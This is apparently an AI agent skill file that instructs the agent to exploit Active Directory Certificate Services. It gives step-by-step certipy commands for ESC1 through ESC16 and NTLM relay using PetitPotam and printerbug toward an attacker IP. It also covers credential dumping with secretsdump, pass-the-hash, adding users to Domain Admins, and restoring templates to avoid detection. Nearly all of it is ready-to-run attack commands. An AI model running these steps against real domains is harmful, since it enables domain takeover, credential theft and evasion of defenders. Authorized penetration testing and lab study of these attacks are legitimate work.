---
name: adcs
description: Exploit Active Directory Certificate Services (ADCS). Use when certipy finds vulnerable templates, when ADCS is present on the domain, when discussing ESC1-ESC16, certificate template abuse, NTLM relay to web enrollment, enrollment agent attacks, pass-the-cert, UnPAC-the-Hash, or any certificate-based attack.
user-invocable: false
allowed-tools: Read
---

# ADCS Exploitation

## Enumerate first — always
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' -M adcs             # CA presence
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -stdout   # all templates
rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip  # BloodHound ADCS nodes
```

## Decision tree
```
enrolleesuppliessubject=true + Client Auth EKU + enrollable by low-priv user → ESC1
Any Purpose EKU + no manager approval → ESC2
Enrollment agent template available + can enroll on behalf of → ESC3
GenericAll/WriteOwner/WriteDACL on template → ESC4
Weak ACL on CA object (PKIAdmins, etc.) → ESC5
EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA → ESC6
ManageCA or ManageCertificates right on CA → ESC7
Web enrollment /certsrv enabled + no EPA + NTLM auth → ESC8 (relay)
Template lacks szOID_NTDS_CA_SECURITY_EXT + GenericWrite on user → ESC9
Weak CertificateMappingMethods or altSecurityIdentities writable → ESC10
CA lacks IF_ENFORCEENCRYPTICERTREQUEST flag → ESC11 (RPC)
Shell on CA server → CA private key extractable → ESC12
issuance policy OID linked to privileged group via msDS-OIDToGroupLink → ESC13
Advanced cert mapping + cross-domain scenario → ESC14
schemaVersion=1 template + can set Application Policies → ESC15 (CVE-2024-49019)
CA globally omits szOID_NTDS_CA_SECURITY_EXT + GenericWrite over CA computer → ESC16
```

## ESC1 — Enroll with arbitrary SAN
Condition: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enrollment
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC2 — Any Purpose EKU
Condition: Any Purpose EKU or no EKU + no manager approval + enrollable
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
# If direct auth fails, use as enrollment agent for ESC3-style abuse
```

## ESC3 — Enrollment agent
Condition: Certificate Request Agent EKU template available + target template allows enrollment agents
```bash
# Step 1: Obtain enrollment agent cert
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{AGENT_TPL}' -dc-ip {IP}
# Step 2: Enroll on behalf of administrator
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TARGET_TPL}' -on-behalf-of '{DOMAIN}\administrator' -pfx agent.pfx -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC4 — Write access on template
Condition: GenericAll / WriteProperty / WriteOwner on a certificate template
```bash
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TPL}' -save-old
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TPL}' -configuration '{TPL}.json'
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TPL}' -configuration '{TPL}.json.bak'  # restore
```

## ESC5 — Weak ACL on CA object
Condition: Low-priv user has write access to CA configuration objects in AD
```bash
# Modify CA config object ACL to grant ManageCA → then ESC7
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add genericAll 'CN={CA},CN=Certification Authorities,...' {USER}
# Then follow ESC7 flow
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
Condition: CA flag set to allow SAN in ANY certificate request
```bash
# Check: certipy find output shows "UserSpecifiedSAN: Enabled"
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template User -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC7 — ManageCA / ManageCertificates
Condition: User has Officer (ManageCA) or ManageCertificates right on CA
```bash
# Grant yourself Officer role
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -add-officer '{USER}'
# Enable the SubCA template (allows requesting arbitrary certs)
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -enable-template SubCA
# Request cert that will be denied, then force-issue it
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template SubCA -upn administrator@{DOMAIN} -dc-ip {IP}
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -issue-request {REQ_ID}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -retrieve {REQ_ID}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC8 — NTLM relay to HTTP enrollment
Condition: /certsrv web enrollment enabled, no EPA, NTLM auth accepted
```bash
# Relay DC auth to CA enrollment
certipy relay -ca {CA_IP} -template DomainController
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}
# Or PetitPotam (no creds needed):
python3 PetitPotam.py {ATTACKER_IP} {DC_IP}
certipy auth -pfx {DC}.pfx -dc-ip {IP}
secretsdump.py.py -k -no-pass {DOMAIN}/{DC}$@{IP}
```

## ESC9 — No security extension + GenericWrite
Condition: Template lacks szOID_NTDS_CA_SECURITY_EXT, GenericWrite over target user
```bash
# Change target's UPN to administrator
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn 'administrator' -dc-ip {IP}
certipy req -u '{TARGET}@{DOMAIN}' -p '{TARGET_PASS}' -ca '{CA}' -template '{TPL}' -dc-ip {IP}
# Restore UPN
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn '{TARGET}@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC10 — Weak certificate mapping
Condition: CertificateMappingMethods has UPN bit set OR altSecurityIdentities writable, GenericWrite on user
```bash
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn 'administrator' -dc-ip {IP}
certipy req -u '{TARGET}@{DOMAIN}' -p '{TARGET_PASS}' -ca '{CA}' -template User -dc-ip {IP}
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn '{TARGET}@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC11 — RPC enrollment without encryption
Condition: CA flag IF_ENFORCEENCRYPTICERTREQUEST not set
```bash
# Relay unencrypted RPC enrollment
certipy relay -ca {CA_IP} -template DomainController -target rpc
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}
certipy auth -pfx {DC}.pfx -dc-ip {IP}
```

## ESC12 — Shell access on CA server
Condition: You have code execution on the CA server
```bash
# Extract CA private key → forge certificates offline
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -backup
# Or from shell on CA: certutil -exportpfx {CA} ca.pfx
# Then forge any certificate offline
certipy forge -ca-pfx ca.pfx -upn administrator@{DOMAIN} -subject 'CN=administrator'
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC13 — Issuance policy OID linked to privileged group
Condition: Template issues cert with issuance policy OID linked to DA group via msDS-OIDToGroupLink
```bash
# Certipy detects this automatically in find output
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -dc-ip {IP}
certipy auth -pfx {USER}.pfx -dc-ip {IP}
# Auth grants membership in the linked group
```

## ESC14 — Advanced certificate mapping abuse
Condition: altSecurityIdentities writable on target, or cross-domain cert mapping misconfigured
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} altSecurityIdentities -v 'X509:<I>DC=local,DC=domain,CN=CA<S>CN=administrator'
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template User -dc-ip {IP}
certipy auth -pfx {USER}.pfx -dc-ip {IP} -username administrator
```

## ESC15 — schemaVersion 1 (CVE-2024-49019 / TombWatcher)
Condition: Template schemaVersion=1, user can set Application Policies in request
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -application-policies 'Client Authentication' -upn 'administrator@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC16 — CA omits security extension globally (Fluffy)
Condition: CA configured to not include szOID_NTDS_CA_SECURITY_EXT, GenericWrite over CA computer
```bash
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user '{CA_COMPUTER}$' -upn 'administrator' -dc-ip {IP}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template Machine -dc-ip {IP}
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user '{CA_COMPUTER}$' -upn '{CA_COMPUTER}$@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC1 via machine account (Authority / Retro pattern)
When template requires machine account enrollment:
```bash
addcomputer.py.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip {IP}
certipy req -u 'FAKE$@{DOMAIN}' -p 'FakePass123!' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## After certipy auth — use the cert/hash
```bash
# Pass-the-Hash (most common)
evil-winrm -i {IP} -u administrator -H {NT_HASH}
nxc smb {IP} -u administrator -H {NT_HASH}
secretsdump.py.py {DOMAIN}/administrator@{IP} -hashes :{NT_HASH} -just-dc

# Pass-the-Ticket
export KRB5CCNAME=administrator.ccache
psexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
wmiexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass

# LDAP shell (when LDAP signing enforced, NTLM blocked)
certipy auth -pfx administrator.pfx -dc-ip {IP} -ldap-shell
# Inside ldap-shell:
#   set_rbcd {ATTACKER}$ {TARGET}
#   add_user_to_group {USER} "Domain Admins"

# PassTheCert (strongest against LDAP signing)
certipy auth -pfx administrator.pfx -dc-ip {IP}   # get .crt + .key
python3 passthecert.py -action add_user_to_group -crt administrator.crt -key administrator.key -domain {DOMAIN} -dc-ip {IP} -user {USER} -group 'Domain Admins'
```

## Gotchas
- **authenticationenabled=false** → template cannot be used for AD auth; skip
- **gMSA accounts** → Kerberoasting always fails; 256-bit random password
- **IsUserSpecifiedSanEnabled=false on CA** → ESC6 not exploitable
- **Template shows vulnerable but you cannot enroll** → check enrollment rights; may need group membership
- **LDAP signing** → use `-ldap-shell`, Kerberos, or PassTheCert
- **StrongCertificateBindingEnforcement** → in Full Enforcement mode (default on newer DCs), some ESC paths fail; use ESC9/ESC10/ESC16 instead
- **Web enrollment on HTTPS with EPA** → ESC8 blocked; look for RPC (ESC11)
- **ESC4 restore** → always restore template after exploitation to avoid detection

## Key References
- https://github.com/ly4k/Certipy/wiki
- https://www.thehacker.recipes/ad/movement/adcs
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-domain-administrator-windows-certificate
- https://github.com/AlmondOffSec/PassTheCert
- https://0xdf.gitlab.io
